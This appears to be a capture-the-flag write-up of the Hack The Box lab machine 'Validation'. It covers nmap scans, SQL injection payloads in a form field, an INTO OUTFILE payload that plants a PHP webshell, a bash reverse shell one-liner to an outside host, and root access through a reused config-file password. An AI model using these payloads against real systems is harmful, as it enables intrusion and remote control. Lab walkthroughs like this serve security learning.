---
title: Validation
published: true
layout: post
---

<br />

---------------
Validation is an easy difficulty Linux machine that involves exploiting an SQL Injection vulnerability present in a website. By leveraging this vulnerability, we can upload a webshell and gain access as www-data. To escalate privileges to root, we discover credentials within a config file, allowing us to log in as root.

<br />

<iframe style="aspect-ratio: 16 / 9; width: 65%; display: block; margin: auto;" src="https://www.youtube.com/embed/frx7Ls9-j6U?si=1TkjVuEKPEZvmf2X" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

<br />

---------------------------------------------------

<br />

## Walkthrough

### Reconnaissance

We will start by **scanning protocolos** in the target machine, this can be divided in 3 phases:
1. Scan for **open ports**.
2. Scan for **services** in these open ports.
3. Scan for **vulnerabilities** in these services.

<br />
Let's start by scanning for **open ports**:

```bash
sudo nmap -sS -sU 10.10.11.116 -p- -T4 --min-rate 5000 -oN all_ports.txt --open -n -Pn
```

![](/assets/Validation/1.png)
<br />
<br />
<br />

There are **4 open ports**:
+ **22/tcp**
+ **80/tcp**
+ **4566/tcp**
+ **8080/tcp**

<br />
Let's check which **services** are running in these ports:

```bash
sudo nmap -sS 10.10.11.116 -p 22,80,4566,8080 -T4 --min-rate 5000 -oX open_ports.xml -oN open_ports.txt --version-all -n -Pn -A
```

![](/assets/Validation/2.png)
<br />
<br />
<br />

We can see that the services correspond to:
+ **22/tcp OpenSSH 8.9p1**
+ **80/tcp Apache httpd 2.4.52**
+ **4566/tcp nginx**
+ **8080/tcp nginx**

<br />

Now we will seek for **vulnerabilities**:

```bash
sudo nmap -sS 10.10.11.116 -p 22,80,4566,8080 -T4 --min-rate 5000 --script="vuln and safe or intrusive and safe or discovery" -oN vulns.txt -oX vulns.xml -n -Pn
```

![](/assets/Validation/3.png)
<br />
<br />
<br />

The scan reports nothing interesting.

<br />

------

<br />
### Foothold

The foothold in this machine """easy""", the quotes are there because **SQLi** is very difficult for me.

<br />

We are facing a website that allows us to register for what seems to be a competition:
![](/assets/Validation/4.png)
<br />
<br />
<br />

We can capture the request and see it in **BurpSuite**:
![](/assets/Validation/5.png)
<br />
<br />
<br />

As the country field is "protected" in the website, because it is a **list and not a text field**, we can attempt **SQLi** on it:

```HTTP
username=Tanades&country=Brazil'
```

![](/assets/Validation/6.png)
<br />
<br />
<br />

We get an **SQL error**, so we can start our SQLi enumeration, beginning by discovering how many fields are being selected using an ***ORDER BY*** clause:

```HTTP
username=Tanades&country=Brazil'+ORDER+BY+1+--+//
```

![](/assets/Validation/7.png)
<br />
<br />
<br />

We can now try to exfiltrate information using an ***UNION SELECT*** clause:
```HTTP
username=Tanades&country=Brazil'+UNION+SELECT+database()+--+//
```

![](/assets/Validation/8.png)
<br />
<br />
<br />

Even though this seems like the way to enumerate credentials and escalate privileges, this is not the case, we have to create a **webshell** using an ***INTO OUTFILE*** clause
```HTTP
username=Tanades&country=Brazil'+UNION+SELECT+"<%3fphp+system($_GET['cmd'])%3b%3f>"+INTO+OUTFILE+"/var/www/html/webshell.php"+--+//
```

![](/assets/Validation/9.png)
<br />
<br />
<br />

Let's see if the command has been successful:
![](/assets/Validation/10.png)
<br />
<br />
<br />

Great let's now send us a **reverse shell**:
```
bash+-c+"bash+-i+>%26+/dev/tcp/10.10.16.10/4444+0>%261"
```

![](/assets/Validation/11.png)
<br />
<br />
<br />

We received the reverse shell, let's **print the flag** for the user htb:

![](/assets/Validation/12.png)
<br />
<br />
<br />


------

<br />
### Privilege Escalation

The privilege escalation for this machine is one of the easiest, we just have to take our time to **read configuration files**.

<br />

In the */var/www/html* directory, we can see a **config.php** file that we couldn't read before as it was being interpreted:

![](/assets/Validation/13.png)
<br />
<br />
<br />

As we can see, this file contains **credentials for the database** for an user called uhc, however this **password also works for the root user**:

```bash
su
script /dev/null -c bash
```

![](/assets/Validation/14.png)
<br />
<br />
<br />
